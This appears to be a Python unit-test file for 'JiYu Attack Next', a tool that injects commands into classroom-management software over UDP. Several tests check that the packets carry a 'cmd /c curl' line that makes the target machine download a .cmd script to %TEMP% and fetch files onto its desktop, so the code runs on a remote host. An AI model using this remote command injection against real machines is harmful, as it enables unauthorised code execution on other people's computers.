        self.assertIn('if not exist "%DESKTOP%\\素材" mkdir', script)
        self.assertIn('if not exist "%DESKTOP%\\素材\\第二章" mkdir', script)
        self.assertIn('set "TARGET=%DESKTOP%\\素材\\第二章\\示例.docx"', script)
        self.assertEqual(script.count("curl.exe"), 2)
        with self.assertRaisesRegex(ValueError, "不一致"):
            self.core.build_items_bootstrap_script([("a.txt", 1)], [])

    def test_file_transfer_serves_multiple_selected_files(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "multi-file"
        shutil.rmtree(directory, ignore_errors=True)
        (directory / "资料" / "子").mkdir(parents=True)
        try:
            (directory / "资料" / "a.txt").write_text("aaa", encoding="utf-8")
            (directory / "资料" / "子" / "b.txt").write_text("bbbb", encoding="utf-8")
            payloads = {}
            reported = []

            def fake_send(
                packets, target, port, loops, interval, report=None, cancel_event=None
            ):
                command = (
                    bytes(packets[0][self.core.COMMAND_OFFSET :])
                    .decode("utf-16le")
                    .split("\x00", 1)[0]
                )
                bootstrap_url = command.split('-o "%TEMP%\\jyt.cmd" "', 1)[1].split(
                    '"', 1
                )[0]
                with urllib.request.urlopen(bootstrap_url, timeout=5) as response:
                    script = response.read().decode("utf-8-sig")
                for line in script.splitlines():
                    if not line.startswith("curl.exe"):
                        continue
                    file_url = line.split('-o "%PART%" "', 1)[1].rstrip('"')
                    with urllib.request.urlopen(file_url, timeout=5) as response:
                        payloads[file_url.rsplit("/", 1)[-1]] = response.read()
                return 1

            items = self.core.collect_transfer_items([directory / "资料"])
            with patch.object(self.core.transport, "send", side_effect=fake_send):
                result = self.core.transfer_file(
                    "192.168.1.10",
                    4705,
                    None,
                    listen_ip="127.0.0.1",
                    timeout=5,
                    report=reported.append,
                    items=[(str(path), relative) for path, relative, _ in items],
                )
            self.assertEqual(sorted(payloads.values()), [b"aaa", b"bbbb"])
            self.assertEqual(result["file_count"], 2)
            self.assertEqual(result["files"], ["资料/a.txt", "资料/子/b.txt"])
            self.assertEqual(result["size"], 7)
            self.assertEqual(result["name"], "2 个文件")
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_command_and_bootstrap_script(self):
        command = self.core.build_transfer_command("http://192.168.1.10:54321/b/token")
        self.assertIn("cmd /c curl ", command)
        self.assertNotIn("powershell", command.lower())
        self.assertIn("http://192.168.1.10:54321/b/token", command)
        self.assertLessEqual(
            len(command.encode("utf-16le")) // 2, self.core.COMMAND_MAX_BYTES // 2
        )
        with self.assertRaisesRegex(ValueError, "报文容量"):
            self.core.build_transfer_command("http://" + "a" * 400)
        script = self.core.build_bootstrap_script(
            "http://192.168.1.10:54321/f/token",
            "报告 100% O'Brien.txt",
            12,
            desktop_dir=r"C:\Users\测试\Desktop",
        )
        self.assertIn("curl.exe", script)
        self.assertIn("报告 100%% O'Brien.txt", script)
        self.assertIn('set "DESKTOP=C:\\Users\\测试\\Desktop"', script)
        self.assertIn('"%%~zA"=="12"', script)
        self.assertNotIn("powershell", script.lower())

    def test_local_ip_detection_prefers_target_route(self):
        first = MagicMock()
        first.__enter__.return_value = first
        first.getsockname.return_value = ("10.0.0.20", 50000)
        with patch.object(socket, "socket", return_value=first):
            self.assertEqual(self.core.detect_local_ip("10.0.0.8"), "10.0.0.20")
        self.assertEqual(first.connect.call_args.args[0], ("10.0.0.8", 9))

    def test_local_ip_detection_ignores_tun_route_source(self):
        tun = MagicMock()
        tun.__enter__.return_value = tun
        tun.getsockname.return_value = ("198.18.0.0", 50000)
        with (
            patch.object(socket, "socket", return_value=tun),
            patch.object(
                socket,
                "getaddrinfo",
                return_value=[
                    (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("198.18.0.0", 0)),
                    (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.49.151.27", 0)),
                    (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("172.22.16.1", 0)),
                ],
            ),
        ):
            self.assertEqual(self.core.detect_local_ip("10.49.131.30"), "10.49.151.27")
        self.assertFalse(self.core.local_info._is_usable_local_address("198.18.0.0"))
        self.assertFalse(
            self.core.local_info._is_usable_local_address("127.0.0.1", "192.168.1.10")
        )
        self.assertTrue(
            self.core.local_info._is_usable_local_address("127.0.0.1", "127.0.0.1")
        )

    def test_file_transfer_retries_udp_command_until_target_requests_file(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "retry"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            source.write_bytes(b"retry-payload")
            sends = []
            server_holder = []

            def fake_send(
                packets, target, port, loops, interval, report=None, cancel_event=None
            ):
                sends.append((target, port))
                if len(sends) == 2:
                    server = server_holder[0]
                    with urllib.request.urlopen(
                        server.file_url("127.0.0.1"), timeout=5
                    ) as response:
                        self.assertEqual(response.read(), b"retry-payload")
                return 1

            original_init = self.core.transport.FileTransferServer.__init__

            def capture_server(server, *args, **kwargs):
                original_init(server, *args, **kwargs)
                server_holder.append(server)

            with (
                patch.object(self.core.transport, "send", side_effect=fake_send),
                patch.object(
                    self.core.transport.FileTransferServer, "__init__", capture_server
                ),
            ):
                self.core.transfer_file(
                    "192.168.1.10",
                    4705,
                    str(source),
                    listen_ip="127.0.0.1",
                    timeout=5,
                    attempts=3,
                    retry_delay=0.01,
                )
            self.assertEqual(len(sends), 2)
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_timeout_reports_connection_stage(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "timeout-stage"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            source.write_bytes(b"data")
            with (
                patch.object(self.core.transport, "send", return_value=1),
                self.assertRaisesRegex(RuntimeError, "目标未访问文件服务.*发送端 IP"),
            ):
                self.core.transfer_file(
                    "192.168.1.10",
                    4705,
                    str(source),
                    listen_ip="127.0.0.1",
                    timeout=0.2,
                    attempts=1,
                )
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_uses_http_server_and_sends_command(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "server"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            payload = b"file-payload" * 100
            source.write_bytes(payload)
            reported = []
            desktop = directory / "desktop"
            desktop.mkdir()
            sent = []

            def fake_send(
                packets, target, port, loops, interval, report=None, cancel_event=None
            ):
                sent.append((packets, target, port, loops, interval))
                command = (
                    bytes(packets[0][self.core.COMMAND_OFFSET :])
                    .decode("utf-16le")
                    .split("\x00", 1)[0]
                )
                bootstrap_url = command.split('-o "%TEMP%\\jyt.cmd" "', 1)[1].split(
                    '"', 1
                )[0]
                with urllib.request.urlopen(bootstrap_url, timeout=5) as response:
                    script = response.read().decode("utf-8-sig")
                file_url = script.split(
                    'curl.exe -fsSL --noproxy "*" --retry 2 -o "%PART%" "', 1
                )[1].split('"', 1)[0]
                with urllib.request.urlopen(file_url, timeout=5) as response:
                    self.assertEqual(response.read(), payload)
                return 1

            with patch.object(self.core.transport, "send", side_effect=fake_send):
                result = self.core.transfer_file(
                    "192.168.1.10",
                    4705,
                    str(source),
                    listen_ip="127.0.0.1",
                    timeout=5,
                    report=reported.append,
                    desktop_dir=str(desktop),
                )
            self.assertEqual(result["name"], "payload.bin")
            self.assertEqual(result["size"], len(payload))
            self.assertEqual(sent[0][1:], ("192.168.1.10", 4705, 1, 0))
            self.assertTrue(any("下载文件" in message for message in reported))
            self.assertTrue(any("目标已下载文件" in message for message in reported))
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_timeout_and_cancellation(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "timeout"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            source.write_bytes(b"data")
            with (
                patch.object(self.core.transport, "send", return_value=1),
                self.assertRaisesRegex(RuntimeError, "超时"),
            ):
                self.core.transfer_file(
                    "192.168.1.10",
                    4705,
                    str(source),
                    listen_ip="127.0.0.1",
                    timeout=0.2,
                )
            stopped = Event()
            stopped.set()
            with self.assertRaisesRegex(RuntimeError, "操作已取消"):
                self.core.transfer_file(
                    "192.168.1.10",
                    4705,
                    str(source),
                    listen_ip="127.0.0.1",
                    timeout=1,
                    cancel_event=stopped,
                )
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_cli_parser_and_dispatch(self):
        parser = cli.build_parser()
        args = parser.parse_args(
            [
                "-ip",
                "192.168.1.10",
                "--file",
                "report.pdf",
                "--file-ip",
                "192.168.1.20",
                "--file-timeout",
                "30",
            ]
        )
        self.assertEqual(args.file, ["report.pdf"])
        self.assertEqual(args.file_ip, "192.168.1.20")
        self.assertEqual(args.file_timeout, 30)
        with self.assertRaises(SystemExit):
            parser.parse_args(["--file", "report.pdf", "-msg", "通知"])

    def test_file_option_accepts_multiple_paths(self):
        parser = cli.build_parser()
        args = parser.parse_args(
            ["-ip", "192.168.1.10", "--file", "a.txt", "文件夹", "b.bin"]
        )
        self.assertEqual(args.file, ["a.txt", "文件夹", "b.bin"])

    def test_cli_log_follows_build_variant_level(self):
        # 正常版本只记 WARNING 及以上，DEBUG 与 INFO 都不落盘。
        log_path = self.test_root / "cli-log" / "cli.log"
        shutil.rmtree(log_path.parent, ignore_errors=True)
        log = core.cli_log.configure(log_path)
        try:
            log.debug("调试细节", "测试", "附加：值")
            log.info("关键节点", "测试")
            log.warning("参数不合法", "测试", "附加：值")
        finally:
            core.cli_log.close()
        text = log_path.read_text(encoding="utf-8")
        self.assertIn("WARNING", text)
        self.assertIn("[测试] 参数不合法", text)
        self.assertIn("\n    附加：值", text)
        self.assertNotIn("DEBUG", text)
        self.assertNotIn("关键节点", text)
        self.assertIsNone(log._handle)

    def test_cli_main_writes_log_next_to_data_directory(self):
        log_path = self.test_root / "cli-main" / "cli.log"
        shutil.rmtree(log_path.parent, ignore_errors=True)
        outcome = SimpleNamespace(deliveries=[], failed=[])
        buffer = io.StringIO()
        with (
            # 正常版本只写 WARNING 及以上，这条用例验证的是日志写在数据目录旁，
            # 因此临时放开 CLI 日志的等级过滤。
            patch.object(core.cli_log, "allows", lambda level: True),
            patch.object(cli, "portable_cli_log_path", return_value=log_path),
            patch.object(cli, "send_tracked", return_value=outcome),
            redirect_stdout(buffer),
        ):
            code = cli.main(["-ip", "192.168.1.10", "-msg", "通知"])
        self.assertEqual(code, 0)
        text = log_path.read_text(encoding="utf-8")
        self.assertIn("命令行启动", text)
        self.assertIn("命令行参数", text)
        self.assertIn("ip=192.168.1.10", text)
        self.assertIn("开始发送", text)
        self.assertIn("命令行结束", text)

    def test_cli_help_and_version_do_not_create_log(self):
        for arguments in (["-h"], ["--version"]):
            with (
                patch.object(cli, "portable_cli_log_path") as log_path,
                redirect_stdout(io.StringIO()),
                self.assertRaises(SystemExit),
            ):
                cli.main(arguments)
            log_path.assert_not_called()

    def test_cli_file_transfer_forwards_every_path(self):
        result = {
            "name": "2 个文件",
            "size": 12,
            "target": "192.168.1.10",
            "targets": ["192.168.1.10"],
            "transferred": ["192.168.1.10"],
            "listen_ip": "192.168.1.20",
            "port": 50000,
            "files": ["包/a.txt", "单.txt"],
            "file_count": 2,
        }
        log_path = self.test_root / "cli-multi" / "cli.log"
        shutil.rmtree(log_path.parent, ignore_errors=True)
        buffer = io.StringIO()
        with (
            # 正常版本只记 WARNING 及以上，这里验证的是参数落到了日志里。
            patch.object(core.cli_log, "allows", lambda level: True),
            patch.object(cli, "portable_cli_log_path", return_value=log_path),
            patch.object(cli, "transfer_file", return_value=result) as transfer,
            redirect_stdout(buffer),
        ):
            code = cli.main(
                [
                    "-ip",
                    "192.168.1.10",
                    "--file",
                    "包",
                    "单.txt",
                ]
            )
        self.assertEqual(code, 0)
        self.assertEqual(transfer.call_args.kwargs["paths"], ["包", "单.txt"])
        self.assertIn("文件已传送", buffer.getvalue())
        self.assertIn("文件传送参数", log_path.read_text(encoding="utf-8"))

    def test_send_cli_parser_keeps_existing_options(self):
        parser = cli.build_parser()
        args = parser.parse_args(
            [
                "-ip",
                "192.168.1.10",
                "-p",
                "4705",
                "-msg",
                "通知",
                "-l",
                "2",
                "-t",
                "3",
                "-e",
                "r",
            ]
        )
        self.assertEqual(args.msg, "通知")
        self.assertEqual(args.l, 2)
        self.assertEqual(args.e, "r")
        args = parser.parse_args(["-ip", "192.168.1.10", "-e", "l"])
        self.assertEqual(args.e, "l")
        args = parser.parse_args(["-ip", "192.168.1.10", "-e", "nc"])
        self.assertEqual(args.e, "nc")
        with self.assertRaises(SystemExit):
            parser.parse_args(["-ip", "192.168.1.10", "-e", "unknown"])


class ConfigFileTests(unittest.TestCase):
    """JSON with comments 配置文件的解析与写回。"""

    def setUp(self):
        self.root = Path("build") / "test-config-temp"
        shutil.rmtree(self.root, ignore_errors=True)
        self.root.mkdir(parents=True, exist_ok=True)
        self.addCleanup(lambda: shutil.rmtree(self.root, ignore_errors=True))

    def test_comments_are_stripped_outside_strings(self):
        text = """
        {
          // 行注释
          "url": "http://example.invalid/a//b",
          /* 块注释 */
          "note": "含有 /* 的原样文本",
        }
        """
        data = core.config.loads(text)
        self.assertEqual(data["url"], "http://example.invalid/a//b")
        self.assertEqual(data["note"], "含有 /* 的原样文本")

    def test_missing_comments_and_empty_text_parse_as_empty_object(self):
        self.assertEqual(core.config.loads(""), {})
        self.assertEqual(core.config.loads("   "), {})
        self.assertEqual(core.config.loads('{"a": 1}'), {"a": 1})

    def test_invalid_json_raises_value_error(self):
        with self.assertRaises(ValueError):
            core.config.loads('{"a": }')
        with self.assertRaises(ValueError):
            core.config.loads("[1, 2, 3]")

    def test_write_adds_header_and_key_comments(self):
        path = self.root / "settings.json"
        core.config.write(
            path,
            {"core": {"device_aliases": {}}, "gui": {"window": {"mica_enabled": True}}},
            {"gui/window/mica_enabled": ("背景模糊开关",)},
        )
        text = path.read_text(encoding="utf-8")
        self.assertTrue(text.startswith("// JiYu Attack Next 配置文件"))
        self.assertIn("// 背景模糊开关", text)
        self.assertTrue(text.endswith("}" + chr(10)))
        self.assertEqual(
            core.config.loads(text),
            {"core": {"device_aliases": {}}, "gui": {"window": {"mica_enabled": True}}},
        )

    def test_read_returns_empty_object_for_missing_file(self):
        self.assertEqual(core.config.read(self.root / "absent.json"), {})

    def test_write_leaves_no_temp_file(self):
        path = self.root / "settings.json"
        core.config.write(path, {"core": {}}, None)
        self.assertEqual(
            sorted(item.name for item in self.root.iterdir()), ["settings.json"]
        )


if __name__ == "__main__":
    unittest.main()
